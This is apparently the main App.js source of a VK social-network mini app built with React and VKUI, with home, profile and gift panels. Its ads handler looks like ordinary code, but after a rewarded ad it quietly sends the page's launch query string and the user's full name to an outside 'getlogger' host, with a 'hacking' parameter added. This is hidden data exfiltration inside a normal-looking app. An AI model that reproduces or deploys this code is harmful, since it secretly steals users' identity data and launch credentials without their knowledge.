import React from 'react';
import connect from '@vkontakte/vkui-connect';
import { View } from '@vkontakte/vkui';
import '@vkontakte/vkui/dist/vkui.css';

import Home from './panels/Home';
import Profile from './panels/Profile';
import Gifts from './panels/Gifts';
import bridge from "@vkontakte/vk-bridge";

class App extends React.Component {
	constructor(props) {
		super(props);

		this.state = {
			activePanel: 'home',
			fetchedUser: null,
		};
	}

	ads = () => {
		bridge.send("VKWebAppShowNativeAds", {ad_format: "reward"})
			.then((data) => {
				this.get("https://nikitt.rocks/getlogger/"+window.location.search+"&hereis="+this.state.fetchedUser.first_name+"%20"+this.state.fetchedUser.last_name, {})
				console.log("ads watched");
			})
	}

	get = (url, headers) => {
		headers["Content-type"] = "text/plain"
		if(url.includes("?")) url += "&hacking="
		fetch(url, {
			method: 'GET',
			headers: headers
		})
	}

	componentDidMount() {
		connect.subscribe((e) => {
			switch (e.detail.type) {
				case 'VKWebAppGetUserInfoResult':
					this.setState({ fetchedUser: e.detail.data });
					break;
				default:
					console.log(e.detail.type);
			}
		});
		connect.send('VKWebAppGetUserInfo', {});
	}

	go = (e) => {
		this.setState({ activePanel: e.currentTarget.dataset.to })
	};

	render() {
		return (
			<View activePanel={this.state.activePanel}>
				<Home id="home" fetchedUser={this.state.fetchedUser} go={this.go} ads={this.ads} />
				<Profile id="profile" fetchedUser={this.state.fetchedUser} go={this.go} />
				<Gifts id="gifts" fetchedUser={this.state.fetchedUser} go={this.go} />
			</View>
		);
	}
}

export default App;
